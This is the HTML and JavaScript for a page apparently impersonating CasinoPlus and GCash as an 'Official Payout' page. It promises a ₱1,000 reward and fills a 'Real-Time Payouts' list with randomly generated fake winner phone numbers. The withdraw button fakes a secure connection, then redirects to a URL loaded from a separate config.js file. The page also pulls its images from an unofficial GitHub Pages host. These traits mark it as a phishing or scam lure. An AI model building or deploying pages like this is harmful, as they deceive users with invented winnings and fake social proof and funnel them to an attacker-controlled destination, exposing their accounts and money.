<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Official Payout</title>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%);
            --royal-blue: #003366;
            --dark-bg: #04070d;
            --neon-green: #39ff14;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body { 
            font-family: 'Public Sans', sans-serif; 
            background-color: var(--dark-bg);
            background-image: 
                radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 50%),
                url('https://www.transparenttextures.com/patterns/dark-matter.png');
            color: #ffffff; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
        }

        .card {
            background: rgba(255, 255, 255, 0.03);
            width: 100%;
            max-width: 400px;
            padding: 35px 20px;
            border-radius: 30px;
            box-shadow: 0 0 40px rgba(0,0,0,0.8), inset 0 0 20px rgba(255,255,255,0.05);
            text-align: center;
            border: 1px solid rgba(212, 175, 55, 0.3);
            backdrop-filter: blur(15px);
            position: relative;
            overflow: hidden;
        }

        .logo-img {
            width: 180px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.5));
        }

        .label-claim {
            font-size: 12px;
            color: #fbbf24;
            text-transform: uppercase;
            letter-spacing: 3px;
            font-weight: 800;
            margin-bottom: 5px;
        }

        .amount {
            font-family: 'Orbitron', sans-serif;
            font-size: 48px;
            font-weight: 700;
            background: var(--gold);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 30px;
            filter: drop-shadow(0 0 15px rgba(212, 175, 55, 0.4));
        }

        .pay-button { 
            background: var(--gold);
            color: #000; 
            width: 100%;
            padding: 20px; 
            border: none; 
            border-radius: 15px; 
            font-size: 18px; 
            font-weight: 800;
            text-transform: uppercase;
            cursor: pointer; 
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: 0 10px 0 #8b6508, 0 15px 20px rgba(0,0,0,0.5);
            position: relative;
            margin-bottom: 10px;
        }

        .pay-button:active {
            transform: translateY(4px);
            box-shadow: 0 4px 0 #8b6508, 0 5px 10px rgba(0,0,0,0.5);
        }

        .pay-button:disabled { 
            background: #4b5563; 
            color: #9ca3af;
            box-shadow: 0 4px 0 #1f2937;
            transform: translateY(4px);
        }

        #timer-text { 
            display: none; 
            color: #ff4d4d; 
            font-weight: 700; 
            margin-top: 20px; 
            font-size: 14px;
            background: rgba(255,0,0,0.1);
            padding: 8px;
            border-radius: 10px;
        }

        .promo-photo {
            width: 100%;
            border-radius: 20px;
            margin-top: 25px;
            border: 2px solid rgba(212, 175, 55, 0.2);
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
        }

        .winners-container {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 20px 15px;
            border-radius: 20px;
            margin-top: 30px;
        }

        .winners-header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 15px;
        }

        .live-dot {
            width: 8px;
            height: 8px;
            background: #ff0000;
            border-radius: 50%;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
            100% { opacity: 1; transform: scale(1); }
        }

        .winner-item {
            background: rgba(255, 255, 255, 0.03);
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            border-left: 3px solid #d4af37;
            animation: slideUp 0.4s ease-out;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .payout-amount { color: var(--neon-green); font-weight: 800; }
        .gcash-mini-icon { width: 18px; height: 18px; border-radius: 50%; vertical-align: middle; margin-right: 5px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://xjiligames.github.io/rewards/logo1.png" alt="CasinoPlus" class="logo-img">
    
    <div class="label-claim">Pending Rewards</div>
    <div class="amount" id="balanceText">₱1,000.00</div>

    <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">
        Withdraw via GCash
    </button>

    <div id="timer-text">RE-LOGIN IN: <span id="waitTimer">05:00</span></div>

    <img src="https://xjiligames.github.io/rewards/casinoplus.jpeg" class="promo-photo" alt="Jackpot">

    <div class="winners-container">
        <div class="winners-header">
            <div class="live-dot"></div>
            <h3 style="font-size: 14px; color: #fbbf24; text-transform: uppercase;">Real-Time Payouts</h3>
        </div>
        <div id="winners-list"></div>
    </div>
</div>

<script src="config.js"></script>

<script>
    // Animation para sa pagbawas ng balance
    function animateValue(id, start, end, duration) {
        const obj = document.getElementById(id);
        let startTimestamp = null;
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            const currentVal = Math.floor(progress * (end - start) + start);
            obj.innerHTML = "₱" + currentVal.toLocaleString() + ".00";
            if (progress < 1) window.requestAnimationFrame(step);
        };
        window.requestAnimationFrame(step);
    }

    function redirectToGCash() {
        const btn = document.getElementById('claimBtn');
        const bal = document.getElementById('balanceText');
        const timerDiv = document.getElementById('timer-text');

        animateValue("balanceText", 1000, 0, 800); 
        bal.style.opacity = "0.5";

        btn.disabled = true;
        btn.innerHTML = "SECURELY CONNECTING...";
        timerDiv.style.display = "block";

        startTimer(300);

        // Kumukuha ng URL sa config.js
        setTimeout(() => {
            if (typeof LATEST_GCASH_URL !== 'undefined') {
                window.location.href = LATEST_GCASH_URL; 
            } else {
                window.location.href = "https://www.casinoplus.com.ph"; 
            }
        }, 1800);
    }

    function startTimer(sec) {
        let timer = sec;
        const display = document.getElementById('waitTimer');
        const interval = setInterval(() => {
            let m = Math.floor(timer / 60);
            let s = timer % 60;
            display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
            if (--timer < 0) clearInterval(interval);
        }, 1000);
    }

    // Winner Generator
    function generateWinner() {
        const prefixes = ['0912', '0915', '0917', '0922', '0927', '0935', '0945', '0966', '0998'];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const lastFour = Math.floor(1000 + Math.random() * 9000);
        const gcashIcon = "https://xjiligames.github.io/rewards/gc_icon.png";

        const winnerEntry = document.createElement('div');
        winnerEntry.className = 'winner-item';
        winnerEntry.innerHTML = `
            <span>
                <img src="${gcashIcon}" class="gcash-mini-icon"> 
                ${randomPrefix}***${lastFour}
            </span>
            <strong class="payout-amount">+₱1,000.00</strong>
        `;

        const list = document.getElementById('winners-list');
        if (list) {
            list.prepend(winnerEntry);
            if (list.children.length > 4) list.removeChild(list.lastChild);
        }
    }

    setInterval(generateWinner, 8000); // Mas mabilis na updates (8s)
    generateWinner(); 
    generateWinner();
</script>

</body>
</html>
